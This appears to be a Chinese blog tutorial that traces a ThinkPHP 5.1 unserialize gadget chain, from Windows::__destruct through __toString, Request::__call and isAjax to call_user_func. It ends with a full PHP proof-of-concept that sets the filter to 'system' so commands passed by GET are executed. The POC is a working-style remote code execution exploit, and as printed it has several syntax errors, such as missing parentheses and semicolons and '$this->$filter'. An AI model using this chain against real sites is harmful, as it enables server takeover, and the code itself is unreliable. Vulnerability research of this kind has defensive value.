# Thinkphp5.1RCE漏洞及POC编写：

看见很多的文章在复现反序列化漏洞的时候，都没有对POC的构造有很好的解析，感觉一直在跟进，然后大体写一下跟进过程中的利用点，然后最后给出POC。跨度有点大，跟不太上，于是自己弄明白打算写一篇比较详细的

## 构建入口：

  * 首先我们先来构造一个漏洞入口：在控制器index中写入一个get传参，并将其反序列化。
  * 基本上算搭建完自己博客，就着tp5顺便来自己审一审pop链，看看自己能不能写出来：

  * 首先我们先来构造一个漏洞入口：在控制器index中写入一个get传参，并将其反序列化。

    
    
    public function index()
        {
            $c = unserialize($_GET['c']);
            var_dump($c);
            return 'Welcome to ThinkPHP!';
            //fetch方法并不是controller命名空间下的方法，而是think命名空间下面的方法，所以我们要先引入think命名空间，才能够调用fetch方法；
            return $this->fetch('index');//这个地方模板文件是对应的文件名，不带文件后缀。
    
        }
    

## 追踪链：

然后我们全局搜索`__destruct()`,找到这个位置：`thinkphp/library/think/process/pipes/Windows.php`,

    
    
    namespace think\process\pipes;
    
    use think\Process;
    
    class Windows extends Pipes{
        public function __destruct()
        {
            $this->close();
            $this->removeFiles();
        }
    }
    

我们跟进`removeFiles()`,

    
    
    private function removeFiles()
        {
            foreach ($this->files as $filename) {
                if (file_exists($filename)) {
                    @unlink($filename);
                }
            }
            $this->files = [];
        }
    

跟进`file_exists`，我们可以发现这个函数将对象解析为字符串，这个地方就可以触发`tostring`方法，全局搜索`tostring()`，在`Conversion`类里面找到这个方法.

## 关联类：

然后我们来梳理一下如何在`POC`中将两个类连接起来的方法：

  * 我们需要从windows类中转到`Conversion`类里面去：这里将两个类连接起来，需要中间的一些桥梁，联想到了继承，use包含。

  * 我们全局搜索一下`Conversion`，看看哪一个类包含了`Conversion`

![](./img/4160124712537023653.png)

  * 因为Model是一个抽象类，在php中，抽象类是这样定义的：

> PHP抽象类应用要点：
>
> 1.定义一些方法，子类必须完全实现这个抽象中所有的方法
>
> 2.不能从抽象类创建对象，它的意义在于被扩展
>
> 3.抽象类通常具有抽象方法，方法中没有大括号
>
> PHP抽象类应用重点
>
> 1.抽象方法不必实现具体的功能，由子类来完成
>
> 2.在子类实现抽象类的方法时，其子类的可见性必须大于或等于抽象方法的定义
>
> 3.抽象类的方法可以有参数，也可以为空
>
> 4.如果抽象方法有参数，那么子类的实现也必须有相同的参数个数

  * 因为抽象类我们无法直接创建对象，所有我们还需要找一个能够继承Model类的类，来进行实例化对象,查找到Pivot类

![](./img/5129635846937115810.png)

  * 所以我们就需要找到包含`Conversion`的类，来与`Conversion`建立关系，`Pivot`类又继承了`Model`类，所以我们就可以让`$files`实例化为`Pivot`类，通过`Pivot`关联到`Model`，然后`Model`又包含了`Conversion`，触发`Conversion`中的`__toString`方法。

    
    
    namespace think;
    
    class Collection
    {
        public function __toString()
            {
                return $this->toJson();
            }
    }
    

## 追踪链：

跟进`Json`方法：

    
    
    public function toJson($options = JSON_UNESCAPED_UNICODE)
        {
            return json_encode($this->toArray(), $options);
        }
    

跟进`toArray()`,仔细分析一下这一些代码：

    
    
    // 追加属性（必须定义获取器）
            if (!empty($this->append)) {
                foreach ($this->append as $key => $name) {
                    if (is_array($name)) {
                        // 追加关联对象属性
                        $relation = $this->getRelation($key);
    
                        if (!$relation) {
                            $relation = $this->getAttr($key);
                            if ($relation) {
                                $relation->visible($name);
                            }
                        }
    

  * 第一个if函数检测append是否为空，所以我们需要Conversion中定义一个append成员属性，这样才能进入，然后对append以提取键值对的形式进行遍历，所以我们在构造poc的时候需要以键值对的形式进行构造，同时name要为一个数组，才能进入`$relation = $this->getRelation($key);`

我们跟进一下`getRelation()`:

    
    
    public function getRelation($name = null)
        {
            if (is_null($name)) {//$name对应的是传过来的键，所以我们的poc不能为空
                return $this->relation;
            } elseif (array_key_exists($name, $this->relation)) {//传过来的键，不能在$this->relation数组中
                return $this->relation[$name];
            }
            return;
        }
    

可以看到，这个函数，有三个分支（return），我们需要让代码往下走，所以`if
(!$relation)`要为真，所以relation的返回值要为null，及`getRelation`函数返回值为return；然后我们继续往下走

    
    
    if (!$relation) {
        $relation = $this->getAttr($key);
        if ($relation) {
            $relation->visible([$attr]);
        }
    }
    

这里继续对relation赋值，跟进getAttr：

    
    
    public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);//$key
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }
    
        // 检测属性获取器
        $fieldName = Loader::parseName($name);
        $method    = 'get' . Loader::parseName($name, 1) . 'Attr';
    
        if (isset($this->withAttr[$fieldName])) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }
    
            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);
        } elseif (method_exists($this, $method)) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }
    
            $value = $this->$method($value, $this->data);
        } elseif (isset($this->type[$name])) {
            // 类型转换
            $value = $this->readTransform($value, $this->type[$name]);
        } elseif ($this->autoWriteTimestamp && in_array($name, [$this->createTime, $this->updateTime])) {
            if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
                'datetime',
                'date',
                'timestamp',
            ])) {
                $value = $this->formatDateTime($this->dateFormat, $value);
            } else {
                $value = $this->formatDateTime($this->dateFormat, $value, true);
            }
        } elseif ($notFound) {
            $value = $this->getRelationAttribute($name, $item);
        }
    
        return $value;
    }
    

我们先关注函数最后返回的是什么值，这里返回了$value,那我们就重点关注$value的走向，先跟进第五行的getData函数：

    
    
    public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
    

  * 第一个if用不了：传过来的$name其实就是对应的值，不为空
  * 第三个if用不了: relation对应的是空
  * 第二个if：所以我们就要想办法构造一个data，来return给value，所以我们在poc中构造的时候需要构造一个data，同时是包含传过来对应值的键值对形式

## 键值对关系：

所以我们现在来梳理一下键值对的关系：

`append(键值对)->foreach对应key=>name(数组)->relation->getRelation($name对应key)->return
relation为空->getAttr($name对应key)->getData($name对应key)->data[$name]`

所以：

    
    
    if (!$relation) {
        $relation = $this->getAttr($key);
        if ($relation) {
            $relation->visible($name);
        }
    }
    

$relation返回的值对应的是`$relation=data[$name]`

## 追踪利用可控参数：

在我们调用方法的时候，我们要选择带有实际参数的方法，这样我们才能够控制

  * 然后我们再回到`conversion`控制器中:
  * 这时候我们就可以利用这个语句来触发`__call()`方法了，我们将`data[$name]`赋值为一个没有visible方法的对象，并触发对象中的call方法：我们找到了`Request`类中的`call`方法

![](./img/3752919084807043724.png)

    
    
    public function __call($method, $args)
    {
        if (array_key_exists($method, $this->hook)) {
            array_unshift($args, $this);
            return call_user_func_array($this->hook[$method], $args);
        }
    
        throw new Exception('method not exists:' . static::class . '->' . $method);
    }
    

  * 这里我们的`method`对应的是不存在的方法`visible`，`args`对应的是`name`的值，进入if语句中，我们知道我们还要定义一个hook的值，其中还要包括键名visible。
  * 但是下面有一个`array_unshift`函数，会对我们`args`的变量值进行改变，所以我们无法直接通过`calluserfunc`函数进行rce。

> array_unshift: 在数组开头插入一个或多个单元

  * 而是将`hook[$method]`指向一个函数,然后再从我们指向的函数中寻找危险函数，这样`hook`就做了一个桥梁的作用

  * 我们查找`call_user_func()`危险函数，看看有哪个函数中包含这个危险函数我们能进行利用。

![](./img/6166605249976382187.png)

  * 但是`filterValue`接收的参数`args`依然是被改变了的，所以我们就不能直接调用`filterValue`函数，而是在另外一个我们可以控制参数的函数上，调用`filterValue`，从而达到我们危险函数对应的两个变量都可控的目的。
  * 我们寻找能调用`filterValue`的地方：

![](./img/1137208422751523518.png)  
但是这里`input`是形参，不可控，所以我们继续寻找调用`input`方法的位置：

![](./img/29059176105651002.png)

`param`中`name`也是形参，我们再找调用`param`方法的地方

![](./img/6563198118600891473.png)

  * 然后我们找到了`isAjax()`方法，同时我们要构造一个`config`变量。这样我们的函数利用链就结束了，起点是`isAjax`函数，最后利用点是`filterValue()`方法，主要控制的参数就是`filter`和`data`。

## 参数设置：

接下来我们就要设置我们对应的危险函数和`value`的值了：调用`isAjax`，设置一个`var_ajax`的值对应`param`中的`$name`值，所以`input`中`$name`可控，同时这里还能获取到`get`传参过来的值赋值给`$this->param`。

![](./img/7244397344525544869.png)

  * 所以input中对应的可控参数就是:`$data=[]->$this->param，$name=config['var_ajax']`=null,这里可以直接跳过input里面对$name的判断，不用跑getData函数对data的处理了：
    
        if ('' != $name) {
        // 解析name
        if (strpos($name, '/')) {
            list($name, $type) = explode('/', $name);
        }
        $data = $this->getData($data, $name);
        var_dump($data);
        if (is_null($data)) {
            return $default;
        }
    
        if (is_object($data)) {
            return $data;
        }
    }
    

  * 但是如果我们name对应有值的话我们就会进入getData，最后执行不了命令；

  * 我们在input函数中，dump一下$name发现是null；

![](./img/6019355867905947536.png)

  * 这里强调一下，input利用的fliterValue方法是if语句内的，而不是else语句里面的方法：

    
    
    if (is_array($data)) {
        var_dump($data);
        array_walk_recursive($data, [$this, 'filterValue'], $filter);
        if (version_compare(PHP_VERSION, '7.1.0', '<')) {
            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
            $this->arrayReset($data);
        }
    

![](./img/1459205341360825127.png)

![](./img/142755582414761246.png)  
这样我们的`filterValue`中利用的危险函数`data`和`filter`就都可控了.

## poc构造：

看着网上的poc自己理解着敲了一遍：

先写链子的入口，跳转到romoveFile()，使用foreach（所以files要定义为一个数组）通过files跳转到Conversion里面的toString()方法，所以这里我们首先要做的就是将files把Conversion和Windows这两个类联系起来：

    
    
    <?php
    namespace think\process\pipes;
    //下面两个引用是用来关联的，实例化Pivot时需要使用命名空间，然后Pivot中又通过引用Model类命名空间，引用Conversion
    use think\model\Pivot;
    use think\model\concern\Conversion;
    //触发destruct以后调用removeFiles()
    class Windows extends Pipes
    {
        private files=[];
        public function __construct{
            $this->files=[new Pivot()];
        }
    }
    

我们需要将windows和Convertion两个连接起来，其中Model中使用了Conversion的命名空间，Pivot继承了Model，所以我们就可以通过Pivot()联系Conversion；

    
    
    //关联到Pivot以后再关联Model
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    //在Model中引用了Conversion命名空间，所以Conversion里面的值我们要在Model里面进行设置。
    namespace think;
    use InvalidArgumentException;
    use think\db\Query;
    abstract class Model
    {
        protected $append=[];
        private $data=[];
        //这里是toArray()里面的以$key为中心的操作
        function __construct{
            $this->append=["Ic4_F1ame"=>["1"]];
             $this->data=["Ic4_F1ame"=>new Request()];
        }
    }
    

进入Request()中触发`__call`方法，我们需要用hook这个桥梁联系起来其他的函数，call传过来的两个参数是`visible`，和`$name`,这个位置需要用`hook[$method]`与我们上面分析的isAjax()连接起来，注意config这里我们是因为调用实参才使用的，并不需要我们进行传什么值，设置为空即可，否则后面代码中的$data不能够成功传入我们的危险函数当中。

    
    
    namespace think
    use think\facade\Cookie;
    use think\facade\Session;
    class Request{
        protected $hook = [];
        protected $filter = "system";
        protected $config = ['var_ajax'=>'',];
        function __construct(){
            $this->hook = ['visible'=>[$this,"isAjax"]];
            $this->$filter = "system";
            $this->$config = ['var_ajax'=>'',];
        }
    }
    

最后我们序列化windows，以它为起点生成序列化字符串：

    
    
    use think\process\pipes\Windows;
    echo urlencode(serialize(new Windows()));
    

合并一下：

    
    
    <?php
    namespace think\process\pipes;
    //下面两个引用是用来关联的，实例化Pivot时需要使用命名空间，然后Pivot中又通过引用Model类命名空间，引用Conversion
    use think\model\Pivot;
    use think\model\concern\Conversion;
    //触发destruct以后调用removeFiles()
    class Windows extends Pipes
    {
        private files=[];
        public function __construct{
            $this->files=[new Pivot()];
        }
    }
    //关联到Pivot以后再关联Model
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    //在Model中引用了Conversion命名空间，所以Conversion里面的值我们要在Model里面进行设置。
    namespace think;
    use InvalidArgumentException;
    use think\db\Query;
    abstract class Model
    {
        protected $append=[];
        private $data=[];
        //这里是toArray()里面的以$key为中心的操作
        function __construct{
            $this->append=["Ic4_F1ame"=>["1"]];
             $this->data=["Ic4_F1ame"=>new Request()];
        }
    }
    namespace think
    use think\facade\Cookie;
    use think\facade\Session;
    class Request{
        protected $hook = [];
        protected $filter = "system";
        protected $config = ['var_ajax'=>'',];
        function __construct(){
            $this->hook = ['visible'=>[$this,"isAjax"]];
            $this->$filter = "system";
            $this->$config = ['var_ajax'=>'',];
        }
    }
    use think\process\pipes\Windows;
    echo urlencode(serialize(new Windows()));
    

最后payload是get和post传参得到结果：  
-get传参给$param，以$data传递给filterFile,最后作为call_user_func的参数  
-post是序列化字符串，其中的filter是我们可控的，最后作为call_user_func的回调函数，执行我们的危险命令。  
![](./img/2000952856826616987.png)

